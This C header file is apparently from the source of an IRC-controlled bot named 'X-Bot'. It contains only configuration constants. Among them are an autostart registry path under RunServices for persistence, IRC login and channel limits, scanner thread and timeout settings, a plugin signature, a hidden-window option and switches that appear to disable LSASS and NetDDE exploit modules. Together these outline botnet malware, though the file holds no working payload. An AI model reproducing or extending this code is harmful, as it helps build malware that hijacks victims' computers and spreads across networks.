//#define CRYPT_DEBUG
#define DEBUG_SYSTEM
//#define DEBUG_LOGGING
#define DEBUG_CONSOLE



#define	XDefaultNull ""

#define	XDefaultRegPath "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices"

#define	XDefaultServiceName "X-Bot"
#define	XDefaultServiceDisplayName "X-Bot"

#define	BAD_SOCKET(x)     ((x)==NULL || (x)==0 || (x)==INVALID_SOCKET)

#define	WinVerMajor()      LOBYTE(LOWORD(GetVersion()))
#define	WinVerMinor()      HIBYTE(LOWORD(GetVersion()))
#define	IsWinVerNT()       ((GetVersion()&0x80000000)==0)
#define	IsWinVerNT4Plus()  (WinVerMajor()>=5 || WinVerMinor()>0 || IsWinVerNT())
#define	IsWinVer98Plus()   (LOWORD(GetVersion())!=4)
#define	IsWinVerMEPlus()   (WinVerMajor()>=5 || WinVerMinor()>10)
#define	IsWinVer2000Plus() (WinVerMajor()>=5)
#define	IsWinVerXPPlus()   (WinVerMajor()>=5 && LOWORD(GetVersion())!=5)

#define	DATA_BUFFER	4096

#define	MAX_LINES 32

#define	MAXIP		16

//#define	MAXTHREADS	256+1 // now 256 // real 512
#define	MAXSUBTHREADS 256+1 //now 256
#define	MAXCLIENTS	128+1 // now 128 // reaal 256
#define	MAXPLUGINS	64+1 // now 64 // reaal 128
#define	MAXPARAMS	16 // was 32

#define	MAX_CONNECTIONS 32

#define	MAXSYSLOGSIZE 50 // was 5

#define	MAXSYSLOGLINE 1024

#define IRCLINE			4096//50 for testing
#define MAXTHREADS		256

#define MAXLOGINS		3
#define MAXLINES		32
#define MAXSCANTHREADS	MAXTHREADS//30//4//600
#define MAXSCANTIME		11000
#define MAXURLLEN		256
#define MAXHOSTNAME		256

#define MAXNICKLEN		28


#define MAXIDENT		128   // max ident

#define MAXPASSLEN 128
#define MAXCHANLEN 64
#define MAXMODELEN 32

#define IRCTIMEOUT 15 // minutes

#define MAXRET 5


#define XShowMode SW_SHOW//SW_HIDE

//#define STARTUP

#define	XPluginVersion 10

#define	XPluginSignature 47257443 // last was 2 not 3

#define	XCompileTime __DATE__ " " __TIME__

#define NO_LSASS
#define NO_NETDDE